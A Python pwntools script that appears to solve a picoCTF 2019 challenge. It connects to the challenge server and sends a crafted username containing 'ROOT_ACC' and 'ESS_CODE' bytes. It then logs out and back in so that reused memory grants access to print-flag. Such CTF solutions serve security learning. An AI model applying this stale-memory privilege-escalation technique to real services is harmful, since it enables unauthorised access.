from pwn import *
import sys
import string


def start():
    global sh
    stdout = process.PTY
    stdin = process.PTY
    sh = process(argv=['nc', '2019shell1.picoctf.com', '21899'], stdin=stdin, stdout=stdout)

def _sendlineafter(term, inp):
    print sh.recvuntil(term)
    print inp
    sh.sendline(inp)

payload = 'A'*8+p64(0x4343415f544f4f52)+p64(0x45444f435f535345)+'A'*8
def test(guess):
    start()
    _sendlineafter(">", 'login')
    _sendlineafter("username\n", '32')
    _sendlineafter("username\n", payload)
    _sendlineafter("> ", 'logout')
    _sendlineafter("> ", 'login')
    _sendlineafter("username\n", '16')
    _sendlineafter("username\n", 'AAA')
    _sendlineafter("> ", 'print-flag')
    output = sh.recvuntil("}")
    _sendlineafter("> ", 'quit')
    print output
    if 'pico' in output:
        return True
    else:
        return False

test(None)
#print payload1 + '\n' + payload2
#while not test(None)
